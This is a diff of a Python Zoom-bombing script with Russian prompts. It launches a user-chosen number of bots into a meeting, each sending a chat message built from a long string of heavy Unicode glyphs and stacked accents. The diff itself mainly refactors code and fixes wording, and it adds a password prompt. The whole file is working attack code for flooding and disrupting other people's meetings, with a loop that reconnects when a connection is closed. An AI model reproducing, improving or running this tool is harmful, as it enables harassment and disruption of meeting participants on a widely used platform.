@@ -1,4 +1,3 @@
-import json
 import logging
 import re
 from base64 import b64encode
@@ -6,7 +5,6 @@ from base64 import b64encode
 import trio
 from halo import Halo
 from loguru import logger
-
 from trio import ClosedResourceError
 from trio_websocket import ConnectionClosed
 
@@ -22,14 +20,14 @@ async def spam(meeting_id: int, password: str, username: str, message: str, url:
     """
     Спамит сообщениями в чат
 
-    :param meeting_id: номер конфернции
-    :param password: пароль конфы
+    :param meeting_id: номер конференции
+    :param password: пароль конференции
     :param username: ник бота
     :param message: сообщение
     :param url: ссылка на конференцию
     """
     zoom = Zoom(url, username)
-    logger.debug(f"Joining conference {meeting_id} with password {password}")
+    logger.debug(f"Joining meeting {meeting_id} with password {password}")
     while True:
         try:
             meeting = await zoom.join_meeting(meeting_id, password)
@@ -41,28 +39,29 @@ async def spam(meeting_id: int, password: str, username: str, message: str, url:
                         await ws.get_message()
                         text = b64encode(message.encode()).decode()
                         await ws.send_message(
-                            json.dumps(
-                                {"evt": 4135, "body": {"text": text, "destNodeID": 0}, "seq": 0}
-                            )
+                            zoom.create_payload(4135, {"text": text, "destNodeID": 0})
                         )
                     except WrongPasswordError:
-                        logger.warning("Server says wrong password, ignoring...")
+                        logger.warning("Server: wrong password, ignoring...")
                         continue
                     except (ClosedResourceError, ConnectionClosed, AttributeError):
-                        logger.warning("Server closed connecting, trying again...")
+                        logger.warning("Server closed connection, trying again...")
                         await trio.sleep(3)
                         break
         except (ClosedResourceError, ConnectionClosed, AttributeError):
-            logger.warning("Server closed connecting, trying again...")
+            logger.warning("Server closed connection, trying again...")
             await trio.sleep(3)
             pass
 
 
 async def main():
     url = input("Введите ссылку на конференцию Zoom: ").strip()
+    password = input(
+        "Введите пароль от конференции, если он есть и не указан в ссылке (или нажмите Enter): "
+    ).strip()
 
     username = input(
-        "Введите юзернейм, который будет использован ботами (без русских букв): "
+        "Введите имя, которое будут использовать боты (без русских букв): "
     )
     bot_count = int(input("Введите количество ботов: "))
     message = "𒐫𪚥𒈙á́́́́́́́́́́́́́́́́́́́́́́́́́́́́́" * 14
@@ -74,17 +73,19 @@ async def main():
 
     meeting_id = url_parsed[0][1]
     if url_parsed[0][2] == "":
-        password = ""
+        password = password or ""
     else:
         password = url_parsed[0][3]
 
     logger.debug(repr(url_parsed))
 
-    spinner = Halo(text="бомбим...", spinner="dots")
+    spinner = Halo(text="In progress...", spinner="dots")
     spinner.start()
     async with trio.open_nursery() as nur:
         for i in range(1, bot_count + 1):
-            nur.start_soon(spam, int(meeting_id), password, username + str(i), message, url)
+            nur.start_soon(
+                spam, int(meeting_id), password, username + str(i), message, url
+            )
 
 
 trio.run(main)
